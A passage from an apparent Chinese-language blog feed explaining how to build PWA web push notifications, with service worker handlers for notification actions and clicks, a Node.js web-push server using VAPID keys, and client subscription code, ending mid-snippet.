class="headerlink" title="通知互動設定 (Require Interaction)"></a>通知互動設定 (Require Interaction)</h3><p>需要等使用者針對通知互動後才會關閉通知，Android 沒有這個問題但 Windows 7 桌面版本的通知會在一定時間後消失，直到 Windows 10 才會在通知列，所以有了這個配置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> title = <span class="string">&quot;Require Interaction Notification&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&quot;With \&quot;requireInteraction: &#x27;true&#x27;\&quot;.&quot;</span>,</span><br><span class="line">  <span class="attr">requireInteraction</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br><span class="line">registration.<span class="title function_">showNotification</span>(title, options);</span><br></pre></td></tr></table></figure><h3 id="通知動作-Actions"><a href="#通知動作-Actions" class="headerlink" title="通知動作 (Actions)"></a>通知動作 (Actions)</h3><p>透過定義 <code>actions</code> 就能夠讓通知帶有按鈕，將通知加上按鈕後，就可以針對按鈕補上後續的事件，以這次小編實作的功能來說，就是以下的配置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="property">registration</span>.<span class="title function_">showNotification</span>(data.<span class="property">title</span>, &#123;</span><br><span class="line">  <span class="attr">image</span>: <span class="string">&quot;https://linyencheng.github.io/img/404-bg.jpg&quot;</span>,</span><br><span class="line">  <span class="attr">icon</span>: <span class="string">&quot;https://linyencheng.github.io/img/icon_wechat.png&quot;</span>,</span><br><span class="line">  <span class="attr">vibrate</span>: [<span class="number">200</span>, <span class="number">100</span>, <span class="number">200</span>, <span class="number">100</span>, <span class="number">400</span>],</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&quot;嗨，我是彥成，喜歡爬山的前端工程師，有個部落格叫前端三分鐘 :)&quot;</span>,</span><br><span class="line">  <span class="attr">actions</span>: [</span><br><span class="line">    &#123; <span class="attr">action</span>: <span class="string">&quot;know-more&quot;</span>, <span class="attr">title</span>: <span class="string">&quot;了解更多&quot;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">action</span>: <span class="string">&quot;fans&quot;</span>, <span class="attr">title</span>: <span class="string">&quot;按讚粉專&quot;</span> &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>實作後實際的畫面<br><img src="/Actions.png"></p></blockquote><h2 id="通知事件流程處理"><a href="#通知事件流程處理" class="headerlink" title="通知事件流程處理"></a>通知事件流程處理</h2><p>經過相關進階設定後，就是針對相關的事件進行後續的處理和優化:</p><ul><li>點擊通知<ul><li>開啟視窗</li><li>Focus Tab</li></ul></li><li>關閉通知</li><li>合併通知</li></ul><h3 id="點擊通知"><a href="#點擊通知" class="headerlink" title="點擊通知"></a>點擊通知</h3><p>透過 service worker 去監聽點擊的事件做後續處理。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;notificationclick&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> clickedNotification = event.<span class="property">notification</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="開啟視窗"><a href="#開啟視窗" class="headerlink" title="開啟視窗"></a>開啟視窗</h4><p>點擊通知後開啟視窗並開啟網頁。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> examplePage = <span class="string">&quot;/hello.html&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> promiseChain = clients.<span class="title function_">openWindow</span>(examplePage);</span><br><span class="line">event.<span class="title function_">waitUntil</span>(promiseChain);</span><br></pre></td></tr></table></figure><h4 id="Focus-Tab"><a href="#Focus-Tab" class="headerlink" title="Focus Tab"></a>Focus Tab</h4><p>如果 URL 已經在瀏覽器中被開啟就直接到那個頁面。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> urlToOpen = <span class="keyword">new</span> <span class="title function_">URL</span>(examplePage, self.<span class="property">location</span>.<span class="property">origin</span>).<span class="property">href</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promiseChain = clients</span><br><span class="line">  .<span class="title function_">matchAll</span>(&#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;window&quot;</span>,</span><br><span class="line">    <span class="attr">includeUncontrolled</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">windowClients</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> matchingClient = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; windowClients.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> windowClient = windowClients[i];</span><br><span class="line">      <span class="keyword">if</span> (windowClient.<span class="property">url</span> === urlToOpen) &#123;</span><br><span class="line">        matchingClient = windowClient;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (matchingClient) &#123;</span><br><span class="line">      <span class="keyword">return</span> matchingClient.<span class="title function_">focus</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> clients.<span class="title function_">openWindow</span>(urlToOpen);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">event.<span class="title function_">waitUntil</span>(promiseChain);</span><br></pre></td></tr></table></figure><h3 id="關閉通知"><a href="#關閉通知" class="headerlink" title="關閉通知"></a>關閉通知</h3><p>關閉通知也有相關事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;notificationclose&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> dismissedNotification = event.<span class="property">notification</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="合併通知"><a href="#合併通知" class="headerlink" title="合併通知"></a>合併通知</h3><p>假設今天加入了 <code>requireInteraction</code> 通知就會常駐，若是通知一直疊加上去也是非常惱人，這時候就可以透過合併通知的設計來優化用戶體驗。</p><ol><li>先抓出現有的</li><li>把現有的關閉再發一則新的</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promiseChain = registration.<span class="title function_">getNotifications</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">notifications</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> currentNotification;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; notifications.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (notifications[i].<span class="property">data</span> &amp;&amp; notifications[i].<span class="property">data</span>.<span class="property">userName</span> === userName) &#123;</span><br><span class="line">      currentNotification = notifications[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> currentNotification;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (currentNotification) &#123;</span><br><span class="line">  currentNotification.<span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="實作"><a href="#實作" class="headerlink" title="實作"></a>實作</h2><p>這次小編實作的程式碼如下:</p><ol><li>跳過等待直接生效</li><li>處理 push 事件，收到就顯示通知，並且在通知加上 aciton</li><li>處理 notificationclick 事件，並且針對不同 action 加上各自的事件</li><li>開啟不同的連結</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;install&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  self.<span class="title function_">skipWaiting</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;push&quot;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> data = event.<span class="property">data</span>.<span class="title function_">json</span>();</span><br><span class="line">  <span class="keyword">switch</span> (data.<span class="property">title</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;前端三分鐘&quot;</span>:</span><br><span class="line">      self.<span class="property">registration</span>.<span class="title function_">showNotification</span>(data.<span class="property">title</span>, &#123;</span><br><span class="line">        <span class="attr">image</span>: <span class="string">&quot;https://linyencheng.github.io/img/404-bg.jpg&quot;</span>,</span><br><span class="line">        <span class="attr">icon</span>: <span class="string">&quot;https://linyencheng.github.io/img/icon_wechat.png&quot;</span>,</span><br><span class="line">        <span class="attr">vibrate</span>: [<span class="number">200</span>, <span class="number">100</span>, <span class="number">200</span>, <span class="number">100</span>, <span class="number">400</span>],</span><br><span class="line">        <span class="attr">body</span>: <span class="string">&quot;嗨，我是彥成，喜歡爬山的前端工程師，有個部落格叫前端三分鐘 :)&quot;</span>,</span><br><span class="line">        <span class="attr">actions</span>: [</span><br><span class="line">          &#123; <span class="attr">action</span>: <span class="string">&quot;know-more&quot;</span>, <span class="attr">title</span>: <span class="string">&quot;了解更多&quot;</span> &#125;,</span><br><span class="line">          &#123; <span class="attr">action</span>: <span class="string">&quot;fans&quot;</span>, <span class="attr">title</span>: <span class="string">&quot;按讚粉專&quot;</span> &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      self.<span class="property">registration</span>.<span class="title function_">showNotification</span>(data.<span class="property">title</span>, &#123;</span><br><span class="line">        <span class="attr">icon</span>: <span class="string">&quot;https://linyencheng.github.io/img/icon_wechat.png&quot;</span>,</span><br><span class="line">        <span class="attr">body</span>: <span class="string">&quot;恭喜! 成功註冊推播通知&quot;</span>,</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;notificationclick&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> url;</span><br><span class="line">  <span class="keyword">if</span> (!event.<span class="property">action</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Notification Click.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (event.<span class="property">action</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;know-more&quot;</span>:</span><br><span class="line">      url = <span class="string">&quot;https://linyencheng.github.io/&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;fans&quot;</span>:</span><br><span class="line">      url = <span class="string">&quot;https://www.facebook.com/linyencheng.tw&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Unknown action clicked: &#x27;<span class="subst">$&#123;event.action&#125;</span>&#x27;`</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  event.<span class="property">notification</span>.<span class="title function_">close</span>(); <span class="comment">// Android 需要觸發關閉</span></span><br><span class="line">  event.<span class="title function_">waitUntil</span>(</span><br><span class="line">    clients.<span class="title function_">matchAll</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;window&quot;</span> &#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">windowClients</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 看有沒有開過了</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; windowClients.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> client = windowClients[i];</span><br><span class="line">        <span class="comment">// 有的話就 Focus 就好了</span></span><br><span class="line">        <span class="keyword">if</span> (client.<span class="property">url</span> === url &amp;&amp; <span class="string">&quot;focus&quot;</span> <span class="keyword">in</span> client) &#123;</span><br><span class="line">          <span class="keyword">return</span> client.<span class="title function_">focus</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 開新的頁面</span></span><br><span class="line">      <span class="keyword">if</span> (clients.<span class="property">openWindow</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clients.<span class="title function_">openWindow</span>(url);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 網站推播通知</title>
      <link href="/2021/09/26/progressive-web-application/pwa-push-notificatoin-introduction/"/>
      <url>/2021/09/26/progressive-web-application/pwa-push-notificatoin-introduction/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是網站推播通知"><a href="#什麼是網站推播通知" class="headerlink" title="什麼是網站推播通知"></a>什麼是網站推播通知</h2><p>推播通知不管對 App 或是網站來說都是一種重新吸引用戶來使用 App 的方法，所以目標是即使網站、App 關閉時也要能在背景接收推播。推播的目的是為了增加 engagement，在行銷領域中 engagement 這個常見的指標就是指用戶在網站或 APP 上的互動程度或者參與度。</p><h2 id="怎麼使用網站推播通知"><a href="#怎麼使用網站推播通知" class="headerlink" title="怎麼使用網站推播通知"></a>怎麼使用網站推播通知</h2><p>因為主要是想在背景接受推播，所以實作上是基於可以背景執行的 Service Worker 來協助相關邏輯撰寫。</p><p>那實際上就是分成推送和接收兩方面，在網站中推送和通知使用不同但互補的 API：</p><ul><li>推送: 當服務器向 Service Worker 提供訊息</li><li>通知: 顯示信息給用戶的服務人員或網頁腳本的作用</li></ul><p>實現推送的三個關鍵步驟是：</p><ol><li>用戶端訂閱通知: 加入註冊訂閱邏輯</li><li>伺服器發送推播訊息: 透過後端叫用相關 API 向用戶設備推播訊息</li><li>用戶端推播事件處理: 當推送到達設備時，透過 Service Worker 的 “推播事件” 來處理後續相關邏輯</li></ol><p>底下連結提供基本的推播示範:<br><a href="https://linyencheng-push-notification.herokuapp.com/">https://linyencheng-push-notification.herokuapp.com/</a></p><h3 id="客戶端訂閱通知"><a href="#客戶端訂閱通知" class="headerlink" title="客戶端訂閱通知"></a>客戶端訂閱通知</h3><p>前端在實作概念上主要是四個步驟:</p><ol><li>獲得向用戶發送推播消息的許可</li><li>拿到伺服器的 VAPID 公開金鑰</li><li>透過 Push API 生成一個 <code>PushSubscription</code> 需要的所有相關訊息，這裡可以把 <code>PushSubscription</code> 當成用戶的 ID</li><li>對伺服器發送訂閱請求</li></ol><h3 id="伺服器發送推播訊息"><a href="#伺服器發送推播訊息" class="headerlink" title="伺服器發送推播訊息"></a>伺服器發送推播訊息</h3><p>在實作後端的時候會遇到三個問題:</p><ol><li>什麼是推播服務、要怎麼執行?<blockquote><p>收到訂閱通知的請求時，將請求內容驗證後就將消息推播到瀏覽器，若是瀏覽器離線，訊息就會排隊儲存起來等連線恢復後繼續傳送</p></blockquote></li><li>相關 API 傳送協定和格式?<blockquote><p>瀏覽器會依照符合 IETF 標準的推播協議實作，伺服器原則上就是使用套件只要提供一個 endpoint 並且處理 PushSubscription 即可。</p></blockquote></li><li>API 可以做到什麼程度<blockquote><p>API 提供了一種向裝置發送訊息的方法</p></blockquote></li></ol><p>只要從伺服器發了推播消息，推播服務會將訊息保留，直到發生以下事件之一：</p><ul><li>裝置上線，推播服務推播訊息成功</li><li>訊息過期，推播服務會將從 queue 刪除</li></ul><h3 id="用戶端推播事件處理"><a href="#用戶端推播事件處理" class="headerlink" title="用戶端推播事件處理"></a>用戶端推播事件處理</h3><p>當推播服務成功推播後，瀏覽器會:</p><ol><li>接收到訊息</li><li>解密數據</li><li>觸發 Service Worker 中的事件</li></ol><p>透過 Service Worker 瀏覽器可以在不打開頁面的情況下去監聽相關事件，所以 App 在 Service Worker 收到 “推播” 事件後，就可以執行任何背景的任務，像是偷偷傳送分析資料、離線快取資源下載、顯示通知等等。</p><h2 id="網頁推播通知伺服器實作"><a href="#網頁推播通知伺服器實作" class="headerlink" title="網頁推播通知伺服器實作"></a>網頁推播通知伺服器實作</h2><p>在還沒實際看教學文件前，會發現如果要從零開始依照推播協議的標準開始實作流程是相對複雜:</p><ol><li>了解並按照協議去處理相關的內文傳輸格式</li><li>了解什麼是 VAPID 金鑰對的概念以及生成方式</li><li>數據加解密流程</li></ol><p>再來就是觸發推播如果遇到問題，會較困難去排除問題。當然隨著開發者工具的進步會慢慢改善，但還是建議使用現成的套件工具來處理推播，Google 提供的 Firebase 就是不錯的方案，如果還是想要體驗自行實作，也可以使用 <a href="https://github.com/web-push-libs/web-push#readme">web-push</a> 這個套件，來縮短開發時間。</p><p>接下來就來示範用 <a href="https://github.com/web-push-libs/web-push#readme">web-push</a> 實作推播伺服器的主要步驟：</p><ol><li>透過現有的推播套件產生並配置相關的 VAPID 金鑰對</li><li>建立一個 API 接收網頁的訂閱請求</li><li>從透過推播套件從後端針對剛剛的訂閱請求推播消息</li></ol><p>可以發現如果是使用套件，底層標準的部分就都不需要實作，可以著重在商業邏輯的開發，透過 node.js 最簡單的版本推播實作程式碼如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> webPush = <span class="built_in">require</span>(<span class="string">&quot;web-push&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> webPush = <span class="built_in">require</span>(<span class="string">&quot;web-push&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 透過現有的推播套件配置相關的 VAPID 金鑰對</span></span><br><span class="line"><span class="keyword">const</span> publicVapidKey = process.<span class="property">env</span>.<span class="property">PUBLIC_VAPID_KEY</span>;</span><br><span class="line"><span class="keyword">const</span> privateVapidKey = process.<span class="property">env</span>.<span class="property">PRIVATE_VAPID_KEY</span>;</span><br><span class="line">webPush.<span class="title function_">setVapidDetails</span>(</span><br><span class="line">  <span class="string">&quot;mailto:test@example.com&quot;</span>,</span><br><span class="line">  publicVapidKey,</span><br><span class="line">  privateVapidKey</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 建立一個 API 接收網頁的訂閱請求</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/subscribe&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 收到訂閱請求</span></span><br><span class="line">  <span class="keyword">const</span> subscription = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">201</span>).<span class="title function_">json</span>(&#123;&#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> payload = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&quot;推播訊息內容&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3. 從透過推播套件從後端針對剛剛的訂閱請求推播消息</span></span><br><span class="line">  webPush</span><br><span class="line">    .<span class="title function_">sendNotification</span>(subscription, payload)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(error));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如果需要進階一點的使用，可以多實作更多相關邏輯:</p><ol><li>實作訂閱請求的儲存分類等機制: 把每次訂閱的 <code>const subscription = req.body;</code> 儲存起來，方便後續進階操作</li></ol><ul><li>舉例來說訂閱時可以多帶參數 <code>/subscribe?device=android&amp;time=morning</code></li></ul><ol start="2"><li>實做 API 去處理要推播訊息: 訊息可以針對裝置或是用戶做分眾，或是取消推播等等</li></ol><p>這次小編其實在後端也沒有多做複雜的處理，目的是為了測試關閉頁面後仍然可以推播，所以補上了一分鐘後再多送一次的邏輯。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  webPush</span><br><span class="line">    .<span class="title function_">sendNotification</span>(subscription, payload30)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(error));</span><br><span class="line">&#125;, <span class="number">60</span> * <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><h2 id="網頁推播通知用戶端實作"><a href="#網頁推播通知用戶端實作" class="headerlink" title="網頁推播通知用戶端實作"></a>網頁推播通知用戶端實作</h2><p>後端可以選擇自己實作也可以直接串接使用現有的服務，程式撰寫上相關操作的 JavaScript API 也相對簡單，接下來就來一步步完成最基本的推播吧。</p><ol><li>檢查支援度，然後針對支援的部分做漸進式增強</li></ol><ul><li>serviceWorker: 背景也要可以收資料</li><li>PushManager: 串接推播</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(<span class="string">&quot;serviceWorker&quot;</span> <span class="keyword">in</span> navigator)) &#123;</span><br><span class="line">  <span class="comment">// Service Worker 不支援</span></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="string">&quot;PushManager&quot;</span> <span class="keyword">in</span> <span class="variable language_">window</span>)) &#123;</span><br><span class="line">  <span class="comment">// Push API 不支援</span></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>請求權限，瀏覽器需要允許推播通知</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">askPermission</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span> (<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> permissionResult = <span class="title class_">Notification</span>.<span class="title function_">requestPermission</span>(<span class="keyword">function</span> (<span class="params">result</span>) &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(result);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (permissionResult) &#123;</span><br><span class="line">      permissionResult.<span class="title function_">then</span>(resolve, reject);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">permissionResult</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (permissionResult !== <span class="string">&quot;granted&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;We weren&#x27;t granted permission.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>註冊 serviceWorker: 相關處理會寫在這邊</li><li>使用 PushManager 訂閱推播: 其中的參數 <code>userVisibleOnly</code> 目前 Chrome 只支援每次收到推送時顯示通知，這代表沒有辦法在背景偷偷做事情，applicationServerKey 則是會用到後端給的 Public Vapid Key，產生出來的 <code>subscription</code> 可以看成是 client 端的 ID。</li><li>向 Sever 發送訂閱: 把剛剛產生的 <code>subscription</code> 傳送到後端</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;serviceWorker&quot;</span> <span class="keyword">in</span> navigator) &#123;</span><br><span class="line">  <span class="comment">// 3. 註冊 serviceWorker</span></span><br><span class="line">  <span class="keyword">const</span> register = <span class="keyword">await</span> navigator.<span class="property">serviceWorker</span>.<span class="title function_">register</span>(<span class="string">&quot;/sw.js&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">scope</span>: <span 